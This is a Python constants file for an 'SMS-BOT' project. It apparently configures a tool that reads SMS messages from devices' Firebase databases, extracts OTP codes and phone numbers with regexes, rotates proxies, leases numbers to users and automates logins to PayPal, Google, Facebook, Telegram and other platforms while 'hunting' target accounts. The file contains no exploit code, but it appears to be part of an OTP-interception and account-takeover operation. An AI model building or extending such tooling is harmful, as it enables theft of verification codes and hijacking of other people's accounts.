"""
Centralized constants for the SMS-BOT project.
Eliminates magic numbers/strings scattered across the codebase.
"""
from enum import Enum
from typing import Final


class AccountStatus(str, Enum):
    """Telegram account status values."""
    ACTIVE = "active"
    LOGGING_IN = "logging_in"
    WAITING_7_DAYS = "waiting_7_days"
    FAILED = "failed"
    UNKNOWN = "unknown"


class ServiceFilter(str, Enum):
    """Service filter options for leases."""
    WHATSAPP = "whatsapp"
    TELEGRAM = "telegram"
    ANY = "any"


class TaskStatus(str, Enum):
    """Bot task status values."""
    IDLE = "Idle"
    SCANNING = "Scanning"
    LOGGING_IN = "Logging in"
    HUNTING = "Hunting"
    BACKUP_SCAN = "Backup Scan"
    ERROR = "Error"


# ==========================
# TIMEOUTS & INTERVALS (seconds)
# ==========================
class Timeouts:
    """Network and operation timeouts."""
    FIREBASE_REQUEST: Final[int] = 10
    FIREBASE_LONG_REQUEST: Final[int] = 20
    PROXY_CHECK: Final[int] = 6
    AI_API_REQUEST: Final[int] = 20
    PLAYWRIGHT_NAVIGATION: Final[int] = 60
    PLAYWRIGHT_ELEMENT: Final[int] = 8
    TELEGRAM_SEND_CODE: Final[int] = 15
    TELEGRAM_SIGN_IN: Final[int] = 15
    OTP_WAIT: Final[int] = 300  # 5 minutes
    HEALTH_POLL: Final[int] = 3


class Intervals:
    """Background task intervals."""
    SCANNER_POLL: Final[float] = 1.0
    BACKUP_SCANNER: Final[int] = 10
    WHATSAPP_SCANNER: Final[int] = 60
    PROXY_SCANNER: Final[int] = 300
    SELF_PING: Final[int] = 600
    DB_FLUSH: Final[int] = 60
    HUNTER_DELAY_MIN: Final[int] = 60
    HUNTER_DELAY_MAX: Final[int] = 180
    HUNTER_CYCLE: Final[int] = 30
    WATCHDOG_CHECK: Final[int] = 3600
    ACTIVITY_FEED_THROTTLE: Final[float] = 60.0
    DB_SAVE_THROTTLE: Final[float] = 2.0
    LEASE_DURATION: Final[int] = 3600  # 1 hour
    DEVICE_BACKUP_TTL: Final[int] = 172800  # 48 hours
    TIMER_ALERT_5M: Final[int] = 300
    TIMER_ALERT_2M: Final[int] = 120


class Limits:
    """Hard limits to prevent resource exhaustion."""
    MAX_OTPS_PER_ACCOUNT: Final[int] = 20
    MAX_OTP_HISTORY_PER_USER: Final[int] = 20
    MAX_ACTIVITY_FEED: Final[int] = 50
    MAX_SAVED_NUMBERS_PER_USER: Final[int] = 50
    MAX_WORKING_PROXIES: Final[int] = 10
    MAX_CONCURRENT_FIREBASE_CHECKS: Final[int] = 5
    MAX_CONCURRENT_PROXY_CHECKS: Final[int] = 10
    MAX_BROWSER_CONTEXTS: Final[int] = 3
    MAX_LOGIN_RETRIES: Final[int] = 3
    OTP_HISTORY_TTL_DAYS: Final[int] = 30


# ==========================
# FIREBASE & DATA PATHS
# ==========================
class FirebasePaths:
    """Firebase Realtime Database paths."""
    CLIENTS = "clients"
    MESSAGES = "messages"
    CLIENTS_SHALLOW = "clients.json?shallow=true"

    @staticmethod
    def messages_for_device(dev_id: str, limit: int = 5) -> str:
        return f"messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast={limit}"

    @staticmethod
    def messages_full(dev_id: str, limit: int = 100) -> str:
        return f"messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast={limit}"


# ==========================
# PLATFORM CONFIGURATION
# ==========================
PLATFORM_LOGIN_URLS: Final[dict[str, str]] = {
    "PayPal": "https://www.paypal.com/in/signin",
    "Facebook": "https://www.facebook.com/login",
    "Instagram": "https://www.instagram.com/accounts/login/",
    "Telegram": "https://web.telegram.org/k/",
    "Twitter": "https://twitter.com/i/flow/login",
    "Google": "https://accounts.google.com/signin",
    "GitHub": "https://github.com/login",
}

PLATFORM_SIGNUP_URLS: Final[dict[str, str]] = {
    "paypal": "https://www.paypal.com/in/webapps/mpp/account-selection",
    "facebook": "https://www.facebook.com/r.php",
    "instagram": "https://www.instagram.com/accounts/emailsignup/",
    "google": "https://accounts.google.com/SignUp",
}

SUPPORTED_PLATFORMS: Final[set[str]] = {
    "PayPal", "Facebook", "Instagram", "Telegram", "Twitter", "Google", "GitHub"
}

PLATFORM_DOMAIN_MAP: Final[dict[str, str]] = {
    "paypal": "PayPal", "facebook": "Facebook", "fb": "Facebook",
    "instagram": "Instagram", "insta": "Instagram",
    "telegram": "Telegram", "t.me": "Telegram",
    "twitter": "Twitter", "x": "Twitter",
    "gmail": "Google", "google": "Google",
    "github": "GitHub"
}


# ==========================
# REGEX PATTERNS (Pre-compiled)
# ==========================
import re

PATTERNS = {
    "OTP": [
        re.compile(r'\b(?:otp|o\.t\.p|verification\s*code|code)\s*(?:is|[:=-])?\s*(\d{4,8})\b', re.I),
        re.compile(r'\b(\d{4,8})\s*(?:is|:)\s*(?:your|the)\s*(?:otp|code|verification)', re.I),
        re.compile(r'\b(\d{4,8})\b[^\n]{0,40}?(?:otp|verification)', re.I),
    ],
    "WHATSAPP_CODE": re.compile(r'code[:\s]+\d{3}-\d{3}', re.I),
    "DLT_ID": re.compile(r'^[A-Z]{1,3}-[A-Z0-9]{2,}-[A-Z]$'),
    "SHORTCODE": re.compile(r'^\d{4,6}$'),
    "ALNUM_ID": re.compile(r'^[A-Z]{2,}-[A-Z0-9]{3,}$'),
    "CARRIER": [
        re.compile(r'(?:jio|airtel|vi\b|bsnl|idea|vodafone|reliance)[\s\-]+(?:mobile\s+|number\s+|no\.?\s*)?(\d{10})', re.I),
        re.compile(r'(?:jio|airtel|vi|bsnl|idea|vodafone|reliance)\s+नंबर\s*[:：]?\s*(\d{10})', re.I),
        re.compile(r'number\s*[:：]\s*(\d{10})', re.I),
    ],
    "DIGITS_ONLY": re.compile(r'\D'),
    "URL_BASE64": re.compile(r'([A-Za-z0-9+/=]{20,})'),
}

# ==========================
# HEALTH SCORE THRESHOLDS
# ==========================
HEALTH_THRESHOLDS = [
    (1, 10),      # < 1 hour
    (6, 9),       # < 6 hours
    (24, 8),      # < 24 hours
    (48, 7),      # < 48 hours
    (24 * 7, 5),  # < 1 week
    (24 * 14, 3), # < 2 weeks
    (24 * 30, 2), # < 1 month
    (float('inf'), 1), # older
]

WS_CHANCE_THRESHOLDS = [
    (1, 96),      # < 1 hour
    (24, 70),     # < 24 hours
    (float('inf'), 97), # older
]


# ==========================
# DEFAULT VALUES
# ==========================
DEFAULTS = {
    "POLL_INTERVAL": 3,
    "SOUND_ENABLED": True,
    "DISCORD_WEBHOOK": "",
    "API_BASE": "/api",
    "OWNER_USERNAME": "operator",
    "OWNER_RANK": "S-RANK HUNTER",
    "COUNTRY": "India",
    "BASE_LABEL_PREFIX": "Base ",
    "BATTERY_UNKNOWN": "0",
    "HEALTH_DEFAULT": 5,
    "CHANCE_DEFAULT": 97,
    "PROXY_MODE": "socks5",
}

# ==========================
# CACHE KEYS
# ==========================
CACHE_KEYS = {
    "FIREBASES": "firebases",
    "TELEGRAM_ACCOUNTS": "telegram_accounts",
    "TARGET_ACCOUNTS": "target_accounts",
    "USER_LEASES": "user_leases",
    "USED_DEVICES": "used_devices",
    "DEVICE_BACKUPS": "device_backups",
    "WHATSAPP_READY": "whatsapp_ready_lines",
    "UPCOMING_TIMERS": "upcoming_timers",
    "WORKING_PROXIES": "working_proxies",
    "CUSTOM_PROXIES": "custom_proxies",
    "ACTIVITY_FEED": "activity_feed",
    "OWNER_PROFILE": "owner_profile",
    "OWNER_SETTINGS": "owner_settings",
    "USERS": "users",
    "VIP_USERS": "vip_users",
    "BANNED": "banned",
    "ADMINS": "admins",
    "SUPER_ADMINS": "super_admins",
    "MINI_TOKENS": "mini_tokens",
    "HUNTING_ENABLED": "hunting_enabled",
    "STATS": "stats",
    "EXTRA_TOKENS": "extra_tokens",
    "USER_LEASES": "user_leases",
    "CUSTOM_COUNTRIES": "custom_countries",
    "DEVICE_NUMBERS": "device_numbers",
}